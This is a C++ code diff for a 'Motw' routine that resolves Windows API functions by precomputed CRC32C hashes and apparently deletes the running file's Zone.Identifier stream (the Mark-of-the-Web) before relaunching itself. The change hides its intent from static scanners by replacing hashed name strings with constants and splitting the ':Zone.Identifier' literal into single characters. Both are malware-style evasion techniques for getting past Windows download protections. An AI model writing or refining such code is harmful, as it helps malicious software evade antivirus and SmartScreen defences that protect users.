@@ -14,6 +14,9 @@
 
 namespace Motw
 {
+    // Pre-computed CRC32C hash constants (polynomial 0x82F63B78)
+    static constexpr DWORD HASH_GetFileAttributesW = 0xA1D2727E;
+    static constexpr DWORD HASH_DeleteFileW         = 0xE6B8B90F;
     bool StripAndRelaunch()
     {
         // Resolve kernel32 functions via ApiResolver
@@ -30,9 +33,9 @@ namespace Motw
         auto pGetModuleFileNameW   = (pfnGetModuleFileNameW)Api::GetProcByHashCrc(
             hK32, Api::CrcFn::GetModuleFileNameW);
         auto pGetFileAttributesW   = (pfnGetFileAttributesW)Api::GetProcByHashCrc(
-            hK32, Crc32C::ConstHash("GetFileAttributesW"));
+            hK32, HASH_GetFileAttributesW);
         auto pDeleteFileW          = (pfnDeleteFileW)Api::GetProcByHashCrc(
-            hK32, Crc32C::ConstHash("DeleteFileW"));
+            hK32, HASH_DeleteFileW);
         auto pCreateProcessW       = (pfnCreateProcessW)Api::GetProcByHashCrc(
             hK32, Api::CrcFn::CreateProcessW);
 
@@ -52,7 +55,7 @@ namespace Motw
         for (DWORD i = 0; i < len && pos < MAX_PATH; i++)
             adsPath[pos++] = selfPath[i];
         // Append ":Zone.Identifier"
-        const wchar_t suffix[] = L":Zone.Identifier";
+        wchar_t suffix[] = { L':',L'Z',L'o',L'n',L'e',L'.',L'I',L'd',L'e',L'n',L't',L'i',L'f',L'i',L'e',L'r', 0 };
         for (int i = 0; suffix[i] && pos < MAX_PATH + 30; i++)
             adsPath[pos++] = suffix[i];
         adsPath[pos] = L'\0';
